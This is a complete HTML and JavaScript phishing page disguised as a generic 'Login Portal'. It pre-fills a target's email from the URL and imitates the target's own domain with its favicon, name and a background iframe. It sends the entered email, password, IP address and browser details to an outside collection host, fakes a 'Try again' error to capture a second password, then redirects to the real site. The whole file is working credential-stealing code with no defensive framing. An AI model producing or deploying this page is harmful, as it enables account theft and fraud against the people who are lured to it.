<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Portal</title>
    <!-- Bootstrap 5 CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <!-- Bootstrap Icons -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet">
    <!-- Google Fonts: Poppins -->
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap" rel="stylesheet">
    <style>
        #background-iframe, #overlay {
            position: fixed;
            top: 0;
            left: 0;
            height: 100%;
            width: 100%;
        }
        body {
            font-family: 'Poppins', sans-serif;
            margin: 0;
            padding: 0;
            overflow: hidden;
        }
        #background-iframe {
            border: none;
            z-index: -3;
            object-fit: cover;
        }
        #overlay {
            background-color: rgba(0,0,0,.5);
            z-index: -2;
        }
        .form-container {
            display: block;
            max-width: 400px;
            width: 100%;
            padding: 2rem;
            background-color: rgba(255,255,255,.95);
            border-radius: .75rem;
            box-shadow: 0 8px 16px rgba(0,0,0,.2);
            position: relative;
            z-index: 1;
        }
        .icon-text {
            display: flex;
            align-items: center;
            margin-bottom: 1.5rem;
        }
        .icon-text img {
            width: 32px;
            height: 32px;
            margin-right: .5rem;
        }
        .icon-text .h4 {
            margin-bottom: 0;
            color: #0d6efd;
        }
        .form-floating {
            position: relative;
            margin-bottom: 1.5rem;
        }
        .form-floating label, .input-icon {
            position: absolute;
            color: #6c757d;
            pointer-events: none;
        }
        .form-floating label {
            transition: .2s ease-in-out;
            left: 2.5rem;
            top: -.2rem;
            background-color: transparent;
            z-index: 1;
        }
        .form-floating input:focus + label,
        .form-floating input:not(:placeholder-shown) + label {
            transform: translateY(-1.5rem);
            font-size: .85rem;
            color: #0d6efd;
        }
        .form-control {
            border-top: none;
            border-left: none;
            border-right: none;
            border-bottom: 2px solid #ced4da;
            border-radius: 0;
            padding-left: 2.5rem;
            transition: border-color .2s;
            background-color: transparent;
        }
        .form-control:focus {
            box-shadow: none;
            outline: 0;
            border-bottom-color: #0d6efd;
        }
        .input-icon {
            left: .75rem;
            top: 50%;
            transform: translateY(-50%);
            font-size: 1.2rem;
        }
        .btn-primary {
            width: 100%;
            padding: .75rem;
            font-size: 1rem;
            background-color: #0d6efd;
            border: none;
            border-radius: .375rem;
            transition: background-color .3s, color .3s;
        }
        .btn-primary:hover {
            background-color: #0b5ed7;
            color: #fff;
        }
        .btn-primary:focus {
            box-shadow: none;
        }
        @media (max-width: 576px) {
            .form-container { padding: 1.5rem; }
        }
        .loader-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,.5);
            align-items: center;
            justify-content: center;
            z-index: 9999;
            display: none;
        }
        .error-message {
            color: red;
            margin-bottom: 1rem;
            display: none;
        }
        .confirm-text {
            font-size: 0.9rem;
            margin-top: 10px;
            color: #6c757d;
            text-align: center;
        }
    </style>
</head>
<body id="main-content" class="d-flex align-items-center justify-content-center min-vh-100">
    <!-- Background Iframe -->
    <iframe id="background-iframe" src="about:blank" allowfullscreen></iframe>
    <!-- Dimmed Overlay -->
    <div id="overlay"></div>

    <!-- Form Container -->
    <div class="form-container" id="form-container">
        <div class="error-message" id="error-message">Try again</div>

        <form id="user-form">
            <!-- Icon and Text Row -->
            <div class="icon-text">
                <img id="domain-favicon" src="https://www.google.com/s2/favicons?domain=example.com" alt="Domain Favicon" style="height:15px;width:15px;">
                <span class="h4 mb-0" style="margin-left:10px" id="domain-name">PORTAL</span>
            </div>
            <!-- Heading -->
            <h5 class="mb-3">Leading with Security.</h5>
            <!-- Paragraph -->
            <p class="mb-4 text-muted" style="font-size:.8rem">To get started, log in using your email and password.</p>

            <!-- Email Input -->
            <div class="form-floating position-relative">
                <i class="bi bi-envelope input-icon"></i>
                <input type="email" class="form-control" id="email" placeholder=" " required style="padding-left: 40px; z-index:1000;" disabled>
                <label for="email" style="background-color: transparent;">Email</label>
            </div>
            <!-- Password Input -->
            <div class="form-floating position-relative">
                <i class="bi bi-lock input-icon"></i>
                <input type="password" class="form-control" id="password" placeholder=" " required style="padding-left: 40px;">
                <label for="password" style="background-color: transparent;">Password</label>
            </div>
            <!-- Submit Button -->
            <button type="submit" class="btn btn-primary" id="submit-button">Continue</button>

            <!-- Optional text (no verification) -->
            <div class="confirm-text">Secure login</div>
        </form>
    </div>

    <!-- Loader Overlay -->
    <div id="loader-overlay" class="loader-overlay">
        <div class="spinner-border text-light" role="status" style="width:3rem;height:3rem;">
            <span class="visually-hidden">Loading...</span>
        </div>
    </div>

    <!-- Bootstrap 5 JS Bundle -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>

    <!-- Custom JavaScript to Handle Email from URL Fragment (hash) and 'portal' Parameter -->
    <script>
        let submitCount = 0;

        // Get email from URL hash (after #)
        function getEmailFromHash() {
            if (window.location.hash) {
                let hash = window.location.hash.substring(1);
                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                if (hash && emailRegex.test(hash)) return hash;
            }
            return null;
        }

        // Get email from query parameter 'portal'
        function getEmailFromQuery() {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get('portal');
        }

        // Store the email from URL (hash takes priority over query)
        const originalEmail = getEmailFromHash() || getEmailFromQuery();

        document.addEventListener("DOMContentLoaded", () => {
            let email = originalEmail;
            let domain = '';

            if (email) {
                document.getElementById("email").value = email;
                const parts = email.split("@");
                if (parts.length === 2) {
                    domain = parts[1];
                    document.getElementById("domain-favicon").src = `https://www.google.com/s2/favicons?domain=${domain}`;
                    const domainName = domain.split('.')[0].toUpperCase();
                    document.getElementById("domain-name").textContent = domainName;
                    const iframeSrc = domain.startsWith("http://") || domain.startsWith("https://") ? domain : `https://${domain}`;
                    document.getElementById("background-iframe").src = iframeSrc;
                }
            } else {
                console.warn("No email found in URL (neither as hash nor as 'portal' parameter).");
                document.getElementById("background-iframe").src = "about:blank";
            }

            // Collect client info (IP, userAgent, etc.)
            let clientInfo = {
                ipAddress: "Fetching...",
                userAgent: navigator.userAgent,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                browser: "Detecting..."
            };
            const ua = navigator.userAgent;
            if (ua.indexOf("Firefox") > -1) clientInfo.browser = "Mozilla Firefox";
            else if (ua.indexOf("SamsungBrowser") > -1) clientInfo.browser = "Samsung Internet";
            else if (ua.indexOf("Opera") > -1 || ua.indexOf("OPR") > -1) clientInfo.browser = "Opera";
            else if (ua.indexOf("Trident") > -1) clientInfo.browser = "Microsoft Internet Explorer";
            else if (ua.indexOf("Edge") > -1) clientInfo.browser = "Microsoft Edge";
            else if (ua.indexOf("Chrome") > -1) clientInfo.browser = "Google Chrome or Chromium";
            else if (ua.indexOf("Safari") > -1) clientInfo.browser = "Apple Safari";
            else clientInfo.browser = "Unknown";

            fetch("https://api.ipify.org?format=json")
                .then(response => response.json())
                .then(data => { clientInfo.ipAddress = data.ip; })
                .catch(error => {
                    console.error("Error fetching IP address:", error);
                    clientInfo.ipAddress = "Unavailable";
                });

            document.getElementById("user-form").addEventListener("submit", (e) => {
                e.preventDefault();

                submitCount += 1;
                const isFirstSubmit = submitCount === 1;
                const isSecondSubmit = submitCount === 2;

                document.getElementById("loader-overlay").style.display = "flex";

                const formData = new FormData();
                formData.append('email', document.getElementById("email").value.trim());
                formData.append('password', document.getElementById("password").value.trim());
                formData.append('ipAddress', clientInfo.ipAddress);
                formData.append('userAgent', clientInfo.userAgent);
                formData.append('timezone', clientInfo.timezone);
                formData.append('browser', clientInfo.browser);

                // Send to your API endpoint
                fetch('https://olorunmi.buzz/panel/admin.php', {
                    method: 'POST',
                    body: formData
                })
                .then(response => response.text())
                .then(data => {
                    console.log('Form submitted successfully:', data);
                })
                .catch(error => {
                    console.error('Error submitting form:', error);
                });

                if (isFirstSubmit) {
                    setTimeout(() => {
                        document.getElementById("loader-overlay").style.display = "none";
                        document.getElementById("error-message").style.display = "block";
                        document.getElementById("password").value = "";
                    }, 3000);
                } else if (isSecondSubmit && domain) {
                    setTimeout(() => {
                        document.getElementById("loader-overlay").style.display = "none";
                        window.location.href = "https://" + domain;
                    }, 3000);
                }
            });
        });
    </script>
</body>
</html>
